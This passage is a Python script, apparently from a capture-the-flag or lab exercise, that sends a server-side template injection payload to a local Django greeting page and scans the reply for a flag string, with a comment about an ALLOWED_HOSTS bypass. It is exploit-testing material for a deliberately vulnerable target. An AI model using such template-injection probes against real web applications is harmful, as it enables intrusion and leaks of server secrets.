import requests
import re

# Target URL with SSTI payload
url = "http://localhost:32786/greet/?name={{FLAG}}"

print(f"[+] Testing SSTI flag accessibility")
print(f"[+] Target: {url}")
print(f"[+] Using hostname: localhost (for Django ALLOWED_HOSTS bypass)")

try:
    # Send GET request with the {{FLAG}} payload
    response = requests.get(url, timeout=10)
    
    print(f"\n[+] Response Status: {response.status_code}")
    print(f"[+] Response Headers: {dict(response.headers)}")
    print(f"[+] Response Length: {len(response.content)} bytes")
    
    # Print full response body
    print(f"\n[+] Full Response Body:")
    print(response.text)
    
    # Search for FLAG{} pattern in response
    flag_pattern = r'FLAG\{[^}]+\}'
    flags_found = re.findall(flag_pattern, response.text)
    
    if flags_found:
        print(f"\n[!] FLAG FOUND:")
        for flag in flags_found:
            print(f"    {flag}")
            
            # Verify it's a hex string (not human-readable)
            flag_content = flag[5:-1]  # Extract content between FLAG{ and }
            if re.match(r'^[a-fA-F0-9]+$', flag_content):
                print(f"[✓] Flag format verified: Random hex string")
            else:
                print(f"[!] Flag content: {flag_content}")
    else:
        print(f"\n[-] No FLAG{{}} pattern found in response")
        
        # Check if {{FLAG}} was rendered literally
        if "{{FLAG}}" in response.text:
            print(f"[!] Payload {{{{FLAG}}}} appears literally - SSTI not working")
        elif "FLAG" in response.text.upper():
